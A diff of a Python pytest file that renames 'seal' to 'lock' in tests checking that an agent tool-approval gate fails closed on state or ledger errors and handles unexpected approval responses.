     probe(hermes, "_t4_net")
-    g = seal(hermes)
+    g = lock(hermes)
     hermes.ledger.boom = RuntimeError("locked")
     res = direct(g, "_t4_net", {})
     assert_not_allowed(res, "ledger failure must not drop the ask")
@@ -1059,10 +1059,10 @@ def test_ledger_raising_on_tool_asked_does_not_turn_approve_into_none(hermes):
 
 @pytest.mark.parametrize("exc", [RuntimeError("Cannot parse plugin state"), PermissionError("ro"),
                                  ValueError("bad json")])
-def test_is_sealed_raising_fails_closed(hermes, exc):
+def test_is_locked_raising_fails_closed(hermes, exc):
     probe(hermes, "_t4_net")
     spy_existing(hermes, "cronjob_manage")
-    g = seal(hermes)
+    g = lock(hermes)
     hermes.state.boom = exc
     for name in ("_t4_net", "cronjob_manage", "read_file"):
         assert_block(direct(g, name, {}), f"state unreadable -> fail closed for {name}")
@@ -1073,12 +1073,12 @@ def test_is_sealed_raising_fails_closed(hermes, exc):
 
 
 @pytest.mark.parametrize("value", ["false", "False", 0, "", None, [], "no"])
-def test_sealed_flag_with_odd_truthy_values(hermes, value):
-    """A stray non-bool in state.json: only literal True should mean sealed? The reverse matters more:
+def test_locked_flag_with_odd_truthy_values(hermes, value):
+    """A stray non-bool in state.json: only literal True should mean locked? The reverse matters more:
     the string 'false' is truthy. Whatever the gate decides, it must not crash or return garbage."""
     probe(hermes, "_t4_net")
-    g = seal(hermes)
-    hermes.state.data["sealed"] = value
+    g = lock(hermes)
+    hermes.state.data["locked"] = value
     res = direct(g, "_t4_net", {})
     assert res is None or (isinstance(res, dict) and res.get("action") in ("approve", "block")), res
 
@@ -1090,7 +1090,7 @@ def test_sealed_flag_with_odd_truthy_values(hermes, value):
 @pytest.mark.parametrize("choice", ["once", "session", "always", "deny", "timeout", "cancelled", "notify_failed",
                                     "smart_approve", "smart_deny", None, "", 7, True, "ONCE", object()])
 def test_post_approval_response_unexpected_choice(hermes, choice):
-    g = seal(hermes, register=False)
+    g = lock(hermes, register=False)
     if g.post is None:
         pytest.skip("gate exposes no post_approval_response handler (contract: tool_allowed/tool_refused come "
                     "from post_approval_response) -- adjudicate where it lives")
@@ -1113,7 +1113,7 @@ def test_post_approval_response_unexpected_choice(hermes, choice):
 
 
 def test_post_approval_response_for_foreign_tool_is_ignored(hermes):
-    g = seal(hermes, register=False)
+    g = lock(hermes, register=False)
     if g.post is None:
         pytest.skip("no post_approval_response handler")
     from hermes_cli.plugins_dispatch import PluginDispatchMixin
